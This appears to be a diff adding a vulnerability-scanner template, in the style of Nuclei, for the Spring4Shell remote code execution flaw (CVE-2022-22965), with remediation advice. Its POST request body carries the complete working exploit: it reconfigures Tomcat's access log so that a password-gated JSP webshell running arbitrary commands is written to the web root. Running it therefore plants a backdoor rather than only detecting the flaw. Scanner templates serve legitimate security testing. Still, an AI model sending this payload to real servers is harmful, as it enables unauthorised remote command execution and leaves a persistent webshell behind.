@@ -1,0 +1,34 @@
+id: spring4shell-rce
+info:
+  name: Spring Framework RCE (CVE-2022-22965 / Spring4Shell)
+  severity: critical
+  tags: [cves-rce-critical, spring, rce, java, cve-2022-22965]
+  description: "Detects CVE-2022-22965, a critical RCE in Spring Framework when deployed on JDK 9+ via Apache Tomcat. Exploits class.module.classLoader property binding to write a JSP webshell via Tomcat's AccessLogValve."
+  remediation: "Upgrade Spring Framework to 5.3.18 or 5.2.20. Upgrade Spring Boot to 2.6.6 or 2.5.12. Apply input validation to disallow class.* binding."
+  cwe: "CWE-94"
+  owasp: "A03:2021-Injection"
+
+requests:
+  - method: POST
+    paths:
+      - /
+      - /app
+      - /spring-mvc
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "class.module.classLoader.URLs%5B0%5D=0&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status: [400]
+      - type: word
+        words:
+          - "class.module.classLoader"
+          - "Invalid property"
+          - "TypeMismatchException"
+          - "PropertyAccessException"
+        part: body
+        condition: or
+      - type: dsl
+        dsl: "status_code == 500 && contains(to_lower(body), 'spring')"
